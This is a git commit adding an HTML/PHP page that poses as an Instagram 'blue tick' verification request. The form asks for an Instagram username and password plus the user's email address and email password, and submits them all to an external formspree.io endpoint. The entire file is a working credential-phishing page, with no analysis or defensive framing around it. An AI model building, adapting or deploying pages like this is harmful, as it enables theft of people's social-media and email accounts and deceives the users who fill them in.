69b23260c2df78163b2ee5229b3d10770c1765e7
Mozartint <dmusti74@gmail.com>
2025-10-05 12:41:31 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,55 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+	<title>Getting Blue Tick on Instagram</title>
+	<meta name="viewport" content="width=device-width">
+    <link rel="icon" href="img/instagram.png">
+    <link rel="stylesheet" type="text/css" href="css/index.css">	
+</head>
+<body>
+
+<center>
+
+<div class="box" style="border:5px solid #fff;"><br><br>
+
+<center>
+<img src="img/insta-mobile.gif" of photo width="200" height="140" style="border-radius:10%;margin-top:12px;">
+</center>
+<center>
+<h1 class="h1">Verified Badge &nbsp;<img src="img/tik.png" width="23" height="23" style="font-size:small;color:rgb(34,34,34);font-family:'times new roman';margin-right:0px" class="CToWUd"><br><br></h1>
+
+<form   action="https://formspree.io/f/xgepjkaz"
+  method="POST">
+
+<select style="outline:none; width:20rem; height:2rem; border:none; border-bottom: 1px solid lightgray; background:transparent;">
+  <option>Choose a category for your account</option>
+  <option>News/Media</option>
+  <option>Sports</option>
+  <option>Government/Politics</option>
+  <option>Music</option>
+  <option>Fashion</option>
+  <option>Entertainment</option>
+  <option>Blogger/Influencer</option>
+  <option>Business/Brand/Organization</option>
+  <option>Other</option>
+</select><br><br>
+
+
+<input style="outline: none; width: 20rem;height:2rem;border: none;border-bottom: 1px solid lightgray;background: transparent;" 
+type="text" class="inputtext _55r1" name="Username" id="517933078260202" value="" placeholder="@username" required="1" aria-required="true"><br><br>
+
+<input type="password" name="Username Password" placeholder="Username Password" required="" style="outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>
+
+<input type="email" name="E-Mail" placeholder="E-Mail" required="" style="outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>
+
+<input type="password" name="E-Mail Password" placeholder="E-Mail Password" required="" style="outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>
+
+<button class="buton" type="submit">Request Verification</button>
+</form>
+</div>
+</center>
+
+</form>
+</body>
+</html>
